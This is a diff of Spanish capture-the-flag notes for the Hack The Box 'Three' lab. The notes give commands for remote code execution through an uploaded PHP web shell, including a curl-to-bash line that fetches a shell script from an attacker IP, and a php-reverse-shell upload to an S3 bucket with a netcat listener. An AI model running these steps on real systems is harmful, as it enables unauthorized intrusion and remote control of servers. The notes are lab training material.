@@ -37,3 +37,20 @@ HACK THE BOX - THREE MACHINE
 - http://s3.thetoppers.htb/shell.php?cmd=curl%2010.10.14.38:8000/shell.sh|bash														-Usamo esta URL para iniciar el "Reverse Shell". 
 
 			-Ahora podemos listar y visualizar cualquier directorio.
+			-Nuestra flag la encontramos en el directorio /var/www/flag.txt
+
+-------------------------------------------------------------------------------------------------------------------------------------
+
+			-Podemos omitir los pasos realizados desde la linea 22 estableciendo un reverse shell mediante el uso de un script generado anteriormente, a continuación el método y los comandos necesarios:
+
+- cp /usr/share/webshells/php/php-reverse-shell.php ./																				-Copiamos el script desde el directorio en el que se encuentre, esto para mayor comodidad y trabajarlo desde el dir en el que nos encontremos
+- ifconfig																															-Verificamos la nuestra ip en tun0
+- vi php-reverse-shell.php																											-Modificamos el archivos y colocamos la ip (tun0) en el apartado $ip e igualmente con el puerto a utilizar $port
+- nc -lvnp 4444																														-Establecemos a netcat en modo escucha por el puerto 4444, puerto que también colocamos en el archivo .php anteriormente
+- aws --endpoint=http://s3.thetoppers.htb s3 cp php-reverse-shell.php s3:http//thetoppers.htb										-Subimos nuestro script en el bucket Amazon S3
+- http://thetoppers.htb/php-reverse-shell.php																						-Ejecutamos el link, y se establece el reverse shell desde el nc en modo listener configurado anteriormente
+.
+.
+.
+
+		Maquina Terminada
